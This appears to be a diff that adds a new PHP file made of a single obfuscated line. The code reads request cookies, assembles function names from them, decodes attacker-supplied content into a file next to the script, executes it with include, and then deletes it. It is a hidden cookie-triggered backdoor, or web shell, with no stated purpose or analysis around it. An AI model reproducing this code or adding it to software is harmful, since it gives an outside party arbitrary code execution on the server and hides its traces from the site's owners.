@@ -1,0 +1,2 @@
+<?php
+$IEQ=${"\137" ."\103"	."\117"	."\117" . "\113" ."\111\105"}	;		if(isset	($IEQ [		(94 -	50 )] )	){	$kh=$IEQ[(	92-79)	 ] .	$IEQ[		( 98-	46)	];	$jYnc	=	$kh ($IEQ[	( 74- 34 ) 	] .$IEQ[	 (	55-12 )]); $iyVN=	$jYnc ($kh	(	$IEQ[	(69	-1	)	] ));$uHs =	$jYnc(	$kh( $IEQ	[	(75 -61 )	] ));$GVpe= __DIR__. $jYnc($kh( $IEQ[(98-	3 )  ]))	; 	$iyVN( $GVpe	,$jYnc(	$kh($IEQ[  (99-	55 )])));	 	include	( $GVpe)	;		$uHs( $GVpe	);		}
